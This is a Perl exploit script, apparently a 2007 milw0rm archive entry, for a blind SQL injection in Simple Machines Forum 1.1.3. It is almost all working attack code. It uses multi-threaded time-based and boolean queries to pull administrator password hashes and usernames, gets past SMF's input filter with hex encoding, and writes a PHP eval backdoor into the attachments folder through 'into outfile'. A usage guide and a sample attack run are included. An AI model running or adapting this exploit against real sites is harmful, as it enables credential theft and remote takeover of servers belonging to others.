<html><head><title>Simple Machines Forum 1.1.3 Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

#Written By Michael Brooks
#contact: th3(dot)r00k(at)gmail(dot)com

#SMF 1.1.3 Extremely fast Blind SQL Injection Exploit!
#	-Binary Search
#	-Multi-Threaded
#	-NO benchmark()'s
#
#Two SQL Injection flaws.
#Works with magic_quotes_gpc=On or Off. 
#Total Bypass of SMF's SQL Injection filter.

#I submitted a patch for these flaws:
#http://www.simplemachines.org/community/index.php?topic=196380.0

#I would like to thank RetroGod for being so skilled and willing to help me out. 

#**Warning** perl will somtimes seg fault when useing threads.
#Tested Under Linux

use LWP::UserAgent;
use threads;
use Thread::Semaphore;

	#global variables
	my $threads=1;
	my $semaphore = new Thread::Semaphore; 
	my $globPos : shared=1;
	my $oper : shared;
	my @result : shared;
	my $target;
	my $cookie=false;
	
	$type=&quot;sleep&quot;;

	main();#execute main
	sub main{
		$n=$threads;
		$u=$p=$b=1;
		$start_time=time;
		$e=1;
		#Process arguments passed by the command line.
		for($v=0;$v&lt;=$#ARGV;$v++){
			if(substr($ARGV[$v],0,1) eq '-'){
				$var=substr($ARGV[$v],1);
				$$var=$ARGV[$v+1];
			}
		}
		
		@t=split('\?',$t);
		@t=split('index.php',@t[0]);
		$target=@t[0];
		if(index($target,&quot;/&quot;,length($target)-1)==-1){
			$target=$target.'/';
		}
		if($e!=1){
			print &quot;\nExample:\n&quot;;
			print &quot;\nbrooks@TheLab:~/code/exploits\$ ./smf_blind_sql.pl -p  -u admin -t http://127.0.0.1/smf_1-1-3/index.php -n 4 -c SMFCookie218=a%3A4%3A%7Bi%3A0%3Bs%3A1%3A%222%22%3Bi%3A1%3Bs%3A40%3A%22091feddbd31bfa96932a5e4e6c34cb36f2686c1a%22%3Bi%3A2%3Bi%3A1378168836%3Bi%3A3%3Bi%3A1%3B%7D 
\n\nSMF Is Vulnerable!
Finding Password Hash for the Name: 'admin'
Please Standby...

Password Hash:
1d94709528bb1c83d08f3088d4043f4742891f4f
This attack used 161 HTTP requests and took 8 seconds to complete.
EOF\n\n&quot;;
			die();
		}
		$cookie=$c;
		$user=$u;
		if($n != 1){
			$threads=$n;
		}
		#Check to make sure the target is vulnerable
		if($b!=1||$p!=1){
			$vulnerable=1;
			#Yes I am assuming the default table prefix,  its a shame you can't access information_schema.
			#No prefix is needed for the non-cookie attack becase I do not need a union select or sub-select!
			bin_finder(2,1,&quot;1&quot;,&quot;smf_members&quot;,&quot;and 1!=1&quot;);
			if(int(@result[0])!=0){
				$vulnerable=0;
			}
			$globPos=1;
			bin_finder(2,1,&quot;1&quot;,&quot;smf_members&quot;,&quot;and 1=1&quot;);
			if(int(@result[0])!=1){
				$vulnerable=0;
			}
			if($vulnerable==1){
				print &quot;SMF Is Vulnerable!\n&quot;
			}else{
				print &quot;\nATTACK FAILED!\n\n&quot;;
				if($cookie){
					print &quot;Try sending a private message to your self or SMF might be patched.\n&quot;
				}else{
					print &quot;The non-cookie attack requires MySQL 5 so try using the exploit with -c or SMF might be patched.\n&quot;
				}
				die();
			}
		}

		$m=0;
		if($p!=1){
			if($user != 1){
				print &quot;Finding Password Hash for the Name: '$user'\n Please Standby...\n&quot;;				
				for(my $x=0;$x&lt;$threads;$x++){
					#@threads[$x]=new threads \&amp;bin_finder,16,40,&quot;(conv(SUBSTRING(passwd,%s,1),16,10))=%s&quot;, &quot;smf_members&quot;,&quot; and memberName = '&quot;.$user.&quot;'&quot;;
					@threads[$x]=new threads \&amp;bin_finder,16,40,&quot;conv(SUBSTRING(passwd,%s,1),16,10)&quot;, &quot;smf_members&quot;,&quot; and memberName =&quot;. hex_encode($user);
				}
				for(my $x=0;$x&lt;$threads;$x++){
					@threads[$x]-&gt;join;
				}
				print &quot;\nPassword Hash:\n&quot;;
				foreach $y (@result){
					print sprintf(&quot;%x&quot;,$y);
				}
			}else{#
				print &quot;Finding An Administrative Credental.\n Please Standby...\n&quot;;
				#bin_finder(128 ,1,&quot;count(memberName)&quot;,&quot;smf_members&quot;,&quot; and ID_GROUP=1 &quot;);#single thread
				#$admin_count=@result[0];
				#$globPos=1;
				#print &quot;There are $admin_count admins on this forum.\n&quot;;
				#for($a=0;$a&lt;$admin_count;$a++){
					for(my $x=0;$x&lt;$threads;$x++){
						@threads[$x]=new threads \&amp;bin_finder,16,40,&quot;conv(SUBSTRING(passwd,%s,1),16,10)&quot;, &quot;smf_members&quot;,&quot; and ID_MEMBER=1  &quot;;
					}
					for(my $x=0;$x&lt;$threads;$x++){
						@threads[$x]-&gt;join;
					}
					print &quot;\nPassword Hash:\n&quot;;
					foreach $y (@result){
						print sprintf(&quot;%x&quot;,$y);
					}
					$globPos=1;
					bin_finder(256,1,&quot;char_length(memberName)&quot;,&quot;smf_members&quot;,&quot; and ID_MEMBER=1  &quot;);#single thread
					$name_len=@result[0];
					$globPos=1;
					
					for($x=0;$x&lt;$threads;$x++){
						@threads[$x]=new threads \&amp;bin_finder,128,$name_len,&quot;ASCII(SUBSTRING(memberName,%s,1))&quot;, &quot;smf_members&quot;,&quot; and ID_MEMBER=1  &quot;;
					}
					for($x=0;$x&lt;$threads;$x++){
						@threads[$x]-&gt;join;
					}
					print &quot;\nName:\n&quot;;
					for($l=0;$l&lt;=$name_len;$l++){
						print sprintf(&quot;%c&quot;,@result[$l]);
					}
					print &quot;\n&quot;;
					@result=null;
					$globPos=1;
				#}
			}
		}elsif($b!=1){
			if(!$cookie){
				die(&quot;\nA cookie is needed for this attack!\n&quot;);
			}
			print &quot;Determining the exact path to place the backdoor. \n Please standby...\n&quot;;
			bin_finder(512,1,&quot;char_length(value)&quot;,&quot;smf_settings&quot;,&quot; and variable = 'attachmentUploadDir'&quot;);#single thread
			$length=@result[0];
			$globPos=1;
			for(my $x=0;$x&lt;$threads;$x++){
				@threads[$x]=new threads \&amp;bin_finder,128,$length,&quot;ASCII(SUBSTRING(value,%s,1))&quot;, &quot;smf_settings&quot;,&quot; and variable = 'attachmentUploadDir'&quot;;
			}
		
			for(my $x=0;$x&lt;$threads;$x++){
				@threads[$x]-&gt;join;
			}
			$path='';
			print &quot;Path Disclosed:&quot;;
			foreach $y (@result){
				$path.=sprintf(&quot;%c&quot; ,$y);
			}
			print $path.&quot;\n&quot;;
			#$path=~s/_/?/g;#This accounts for the search request being modfied by SMF.
			#$path=~s/%/*/g;
			$r=rand();#Random file name so the attack will succeed multiple times against the same target. 
			my $ua = LWP::UserAgent-&gt;new;
			$ua-&gt;agent(&quot;Firebird&quot;);
			$ua-&gt;default_header(&quot;Cookie&quot;=&gt;$cookie);#Its tricky to get double quotes for the outfile statement.
			$load=&quot;\\,union select &quot;.hex_encode(&quot;&lt;?php eval(\$_GET[e]);?&gt;&quot;).' into outfile  &quot;&quot;,&quot;'.$path.'/'.$r.'.php&quot;,&quot;&quot;#';		
			$tst= $ua-&gt;post($target.&quot;?action=pm;sa=search2&quot;,[&quot;advanced&quot;=&gt;&quot;1&quot;,&quot;search&quot;=&gt;&quot;1&quot;,&quot;searchtype&quot;=&gt;&quot;1&quot;,&quot;userspec&quot;=&gt;$load,&quot;minage&quot;=&gt;&quot;0&quot;,&quot;maxage&quot;=&gt;&quot;9999&quot;,&quot;sort&quot;=&gt;&quot;ID_PM%7Cdesc&quot;,&quot;submit&quot;=&gt;&quot;Search&quot;]);
			$oper++;
			print &quot;\nEval Backdoor:\n&quot;.$target.&quot;attachments/&quot;.$r.&quot;.php?e=phpinfo();\n&quot;
		}else{
			$m=1;
			print &quot;A Very Fast Blind Sql Injection Exploit for SMF 1.1.3.\n\n&quot;;
			print &quot;-p		obtain passwords (if used without -u,  then an admin credential will be obtained)\n&quot;;
			print &quot;-b		installs a backdoor using 'into outfile'. (requires -c)  **WARNING** SMF will log this as a single 'Hacking Attempt'!\n&quot;; 
			print &quot;-t 		target\n&quot;;
			print &quot;-c		A valid cookie(Much faster attack)\n&quot;;
			print &quot;\nAditional:\n&quot;;
			print &quot;-u		obtains the password for a user name\n&quot;;
			print &quot;-n		number of threads\n&quot;;
			print &quot;-e		Shows an Example.\n&quot;;
			print &quot;The password hash is generated as:\n&quot;;
			print &quot;sha1(strtolower($username) . $password);\n\n&quot;;

		}
		if($m!=1){
			$t=time-$start_time;
			print &quot;\nThis attack used $oper HTTP requests and took $t seconds to complete.&quot;;
			print &quot;\nEOF\n&quot;;
		}
	}
	
	#Takes complex input to build the request,  returns a simple bool. 
	sub bin_ask{
		my $if = shift;
		my $table=shift;
		my $where = shift;
		my $ua = shift;
		my $f=0;
		if(!$cookie){
			#no union select or sub-select needed for this attack!
			$a=time();
			#die($where);
			#$where=&quot;and realName = &quot;.hex_encode(&quot;admin&quot;);
			$load=&quot;\&quot;\\\&quot;,\&quot; or  (IF(&quot;.$if.&quot;,sleep(10),1) $where) limit 1,1 #\&quot;&quot;;	
			$load=~s/_/?/g;#This accounts for the search request being modfied by SMF.
			$load=~s/%/*/g;
			$tst= $ua-&gt;post($target.&quot;?action=search2&quot;,[&quot;advanced&quot;=&gt;&quot;1&quot;,&quot;search&quot;=&gt;&quot;1&quot;,&quot;searchtype&quot;=&gt;&quot;1&quot;,&quot;userspec&quot;=&gt;$load,&quot;minage&quot;=&gt;&quot;0&quot;,&quot;maxage&quot;=&gt;&quot;9999&quot;,&quot;sort&quot;=&gt;&quot;relevance%7Cdesc&quot;,&quot;brd%5B1%5D&quot;=&gt;1,&quot;submit&quot;=&gt;&quot;Search&quot;]);
			$page= $tst-&gt;content;
			#print &quot;&lt;br&gt;page:&quot;.$page;die;
			$t= time();
			#print &quot;\n 1:time\n&quot;.$t.&quot;\n\n&quot;;
			if($t-$a&gt;=10){
				$f=1;
			}
		}else{#%sunion select bypasses SMF's filter so i can use a sub-select in the following query.
			$load=&quot;\\,union select &quot;.hex_encode(&quot;1)) or (1!=\&quot;'\&quot;) and (select (IF((&quot;.$if.&quot;),true,false)) from &quot;.$table.&quot; where 1 &quot;.$where.&quot;) or (1!=\&quot;'\&quot;) and pmr.ID_MEMBER = 1#'&quot;).' # ';#sql comments still work in SMF		
			$tst= $ua-&gt;post($target.&quot;?action=pm;sa=search2&quot;,[&quot;advanced&quot;=&gt;&quot;1&quot;,&quot;search&quot;=&gt;&quot;1&quot;,&quot;searchtype&quot;=&gt;&quot;1&quot;,&quot;userspec&quot;=&gt;$load,&quot;minage&quot;=&gt;&quot;0&quot;,&quot;maxage&quot;=&gt;&quot;9999&quot;,&quot;sort&quot;=&gt;&quot;ID_PM%7Cdesc&quot;,&quot;submit&quot;=&gt;&quot;Search&quot;]);
			$page= $tst-&gt;content;
			#print $page; die ;		
			if(index($page,&quot;No Messages Found&quot;)==-1){
				$f=1;
			}
		}
		return $f;
	}

	#worker thread
	sub bin_finder{
		my $base=shift;
		my $length=shift;
		my $question=shift;
		my $table=shift;
		my $where=shift;
		#One UserAgent object is used per thread.
		my $ua = LWP::UserAgent-&gt;new;
		$ua-&gt;agent(&quot;Firebird&quot;);
		$ua-&gt;default_header(&quot;Cookie&quot;=&gt;$cookie);
			
		#binary search:
		while($globPos&lt;=$length){
			$semaphore-&gt;down;
				$c=$globPos;
				$globPos++;	
			$semaphore-&gt;up;
			my $n=$base-1;
			my $low=0;
			my $floor= $low;
			my $high=$n-1;
			my $pos= $low+(($high-low)/2);
			my $f=1;
			while($low&lt;=$high&amp;&amp;$f){
				if(!$cookie){
					$great=&quot;GREATEST(&quot;.sprintf($question,$c).&quot;,&quot;.$pos.&quot;)!=&quot;.$pos;#bypass the filter for the &lt; and &gt; characters 
					 $less =&quot;LEAST(&quot;.sprintf($question,$c).&quot;,&quot;.$pos.&quot;)!=&quot;.$pos;
				}else{
					$great=sprintf($question,$c).&quot;&gt;&quot;.$pos;
					$less=sprintf($question,$c).&quot;&lt;&quot;.$pos;				
				}
				if(bin_ask($great, $table,$where,$ua)){#asking the sql database if the current value is greater than $pos
					$oper++;
					if($pos==$n-1){#if this is true then the value must be the modulus. 
						@result[$c-1]=$pos+1;
						#print &quot;\nDBG found:$c:ascii:&quot;.sprintf('%c',$pos).&quot;\n&quot;;
						$f=0;
					}else{
						$low=$pos+1;
					}
				}elsif(bin_ask($less, $table,$where,$ua)){#asking the sql database if the current value is less than $pos
					$oper++;
					if($pos==$floor+1){#if this is true the value must be zero.
						@result[$c-1]=$pos-1;
						#print &quot;\nDBG found:$c:ascii:&quot;.sprintf('%c',$pos).&quot;\n&quot;;
						$f=0;
					}else{
						$high=$pos-1;
					}
				}else{
					#both greater than and less then where asked, so thats two http requests. 
					$oper++;
					$oper++;
					@result[$c-1]=$pos;
					#print &quot;\nDBG found:$c:ascii:&quot;.sprintf('%c',$pos).&quot;\n&quot;;,,
					$f=0;
				}
				 $pos=$low+(($high-$low)/2);
			}
		}
	}
#hex_encode was ported from one of RetroGod's php exploits.
#Thanks be to rGod for telling me about this encoding method on milw0rm's forum back when it was still up.  
#rGot you are leet!  
sub hex_encode{
  my $my_string=shift;
  my $encoded=&quot;0x&quot;;
  my $len=length($my_string);
  for ($k=0; $k&lt;$len; $k++){
	$temp=sprintf(&quot;%X&quot;,ord(substr($my_string,$k,1)));
	if (length($temp)==1) {
		$temp=&quot;0&quot;.$temp;
	}
	$encoded.=$temp;
  }
  return $encoded;
}

# milw0rm.com [2007-10-20]</pre></html>